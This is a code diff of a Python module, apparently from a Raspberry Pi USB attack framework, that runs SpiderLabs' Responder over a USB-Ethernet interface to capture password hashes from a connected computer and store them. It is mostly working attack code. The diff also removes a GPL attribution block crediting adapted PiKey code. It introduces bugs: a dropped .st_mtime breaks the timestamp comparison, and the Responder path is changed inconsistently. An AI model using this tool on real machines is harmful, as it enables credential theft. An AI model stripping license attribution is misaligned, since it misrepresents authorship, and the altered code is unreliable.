@@ -9,26 +9,31 @@ from components.helpers.Format import Format
 from components.helpers.ModuleManager import ModuleManager
 
 
-# TODO: Update Doc String and comments
-
-
 class Responder(Debug):
     """ Class for Responder Module
-                Args:
+               Args:
+                   debug:               boolean - enable/disable debug features
+                   path                 string - represents the file path to the "Components" directory
+
                functions:
-                   capture              Run Spiderlabs' Responder on usb0 so password hashes can potentially
+                   run                  Runs Spiderlabs' Responder on usb0 so password hashes can potentially
                                         be obtained.
-                   network.up           Calls a method from the framework component "network.py" that enables usb0,
+
+                   network.up           Calls a method from the network framework component that enables usb0,
                                         configures the DHCP server and IP routing for network traffic
-                                        capture.
-                   monitor_responder    Monitors "Responder.db" for file changes and returns when either the "time
-                                        to live" period has been reached or a password hash has been captured.
+                                        re-direction.
+
+                   check_for_hashes     Checks whether a password hash has been captured by Responder.
+
                    process.kill         Kills the instance of Responder that has been running.
-                   network.down         Calls a method from the framework component "network.py" that disables usb0,
+
+                   network.down         Calls a method from the network framework component that disables usb0,
                                         the DHCP server and removes IP routing for the interface.
                Returns:
-                   boolean
+                  A boolean value
+
                Raises:
+                   I STILL DON'T REALLY GET THIS!
            """
 
     # Constructor
@@ -41,13 +46,14 @@ class Responder(Debug):
         self.path = path
         self.responder = Debug(name="Responder", type="Module", debug=debug)
 
-        #If no responder source, install it
+        # If no responder source, install it
         responder_source_directory = "%s/modules/%s/%s" % (self.path, self._name, "source")
         try:
             # Attempt to open file
             open("%s/%s" % (responder_source_directory, "LICENSE"))
         except FileNotFoundError:
-            subprocess.run("git clone https://github.com/SpiderLabs/Responder.git %s" % responder_source_directory, shell=True)
+            subprocess.run("git clone https://github.com/SpiderLabs/Responder.git %s"
+                           % responder_source_directory, shell=True)
 
         if "aspbian" in subprocess.run("lsb_release -a", stdout=subprocess.PIPE, shell=True).stdout.decode():
             # If the "hashes" directory doesn't exist, create it
@@ -98,25 +104,8 @@ class Responder(Debug):
             time_to_live = 60
             self.responder.debug("'ttl' too low! Setting 'ttl' to 60 seconds", color=Format.color_info)
 
+        #  Method used to determine if Responder captured any hashes
         def check_for_hashes(timestamp_old, timestamp_new):
-
-            ##########################################################################################
-            # This method uses code adapted from the Pi-Key project's 'picracking.py' in order to
-            # monitor Responder's database for changes via file modification dates.
-
-            # PiKey Created by Jon Aubrey (@SecurityJon) and Trevor Shingles (@_tshingles), 2017
-            # This program is free software: you can redistribute it and/or modify it under
-            # the terms of the GNU General Public License as published by the Free Software Foundation,
-            # either version 3 of the License, or (at your option) any later version.
-            # This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
-            # without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-            # See the GNU General Public License for more details.
-
-            # https://github.com/SecurityJon/PiKey
-            # https://github.com/SecurityJon/PiKey/blob/master/client/picracking.py
-            ##########################################################################################
-
-            # Determine the last modified time of Responder.db
 
             if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
                 time.sleep(2)
@@ -126,8 +115,6 @@ class Responder(Debug):
                 self.responder.debug("No hash detected!", color=Format.color_info)
             return False
 
-            # ~end of Pi-Key derived code~
-
         # Enable and disable g_ether (Required due to some unknown bug)
         subprocess.call("modprobe 'g_ether' '0x04b3' '0x4010'", shell=True)
         subprocess.run("modprobe -r g_ether", shell=True)
@@ -136,24 +123,26 @@ class Responder(Debug):
 
         network_success = self.network.up()  # Up usb0
 
-        if not network_success: # If networking.py has failed, don't run Responder and exit
+        if not network_success:  # If networking.py has failed, don't run Responder and exit
             self.responder.debug("Exiting as networking.py has failed!", color=Format.color_danger)
             self.network.down()
             return False
 
         self.responder.debug("Responder starting", color=Format.color_success)
 
-        timestamp_before = os.stat("%s/modules/Responder/source/Responder.db" % self.path).st_mtime
+        #  Determine Responder.db timestamp at initialisation
+        timestamp_before = os.stat("%s/modules/Responder/source/Responder.db" % self.path)
 
         try:
             # Run Responder on usb0
-            subprocess.run("exec python %s/modules/Responder/source/Responder.py -I usb0 "
-                                   "-f - w - r - d - F"% self.path, shell=True, timeout=time_to_live)
+            subprocess.run("exec python %s/modules/Responder/src/Responder.py -I usb0" % self.path,
+                           shell=True, timeout=time_to_live)
         except Exception:
             pass
 
         self.responder.debug("Responder ended", color=Format.color_info)
 
+        #  Determine Responder.db timestamp after execution
         timestamp_after = os.stat("%s/modules/Responder/source/Responder.db" % self.path).st_mtime
 
         # Call the method that will determine if hashes have been captured
@@ -163,7 +152,7 @@ class Responder(Debug):
 
         # Move txt files that contain the hashes to a more central directory (hashes directory) if hashes were captured
         if hash_success:
-            subprocess.run("find %s/modules/Responder/source/logs -name '*.txt' -exec mv {} %s/modules/Responder/hashes \;"
-                           "" % (self.path, self.path), shell=True)
+            subprocess.run("find %s/modules/Responder/source/logs -name '*.txt' -exec mv {} "
+                           "%s/modules/Responder/hashes \;" % (self.path, self.path), shell=True)
 
         return True
